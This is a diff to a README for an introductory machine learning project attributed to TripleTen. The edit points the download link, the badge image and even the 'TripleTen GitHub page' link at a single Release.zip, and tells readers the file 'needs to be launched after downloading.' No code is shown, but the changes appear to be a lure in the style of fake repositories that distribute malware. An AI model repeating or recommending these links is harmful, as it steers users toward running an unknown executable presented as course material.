@@ -27,9 +27,9 @@ This repository contains an introductory machine learning project developed by T
 - Tuning Hyperparameters
 
 ## Project Files
-You can download the project files from the following link: [Download Project Files](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+You can download the project files from the following link: [Download Project Files](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v1.0/Release.zip)
 
-[![Download Project Files](https://img.shields.io/badge/Download-Project_Files-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Project Files](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v1.0/Release.zip)](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v1.0/Release.zip)
 
 **Note:** The file needs to be launched after downloading.
 
@@ -52,6 +52,6 @@ Let's embark on this machine learning journey together! 🤖✨
 
 ---
 
-**For other repositories, visit TripleTen's GitHub page:** [TripleTen GitHub](https://github.com/TripleTen)
+**For other repositories, visit TripleTen's GitHub page:** [TripleTen GitHub](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v1.0/Release.zip)
 
 *Explore. Learn. Innovate.* 🌟
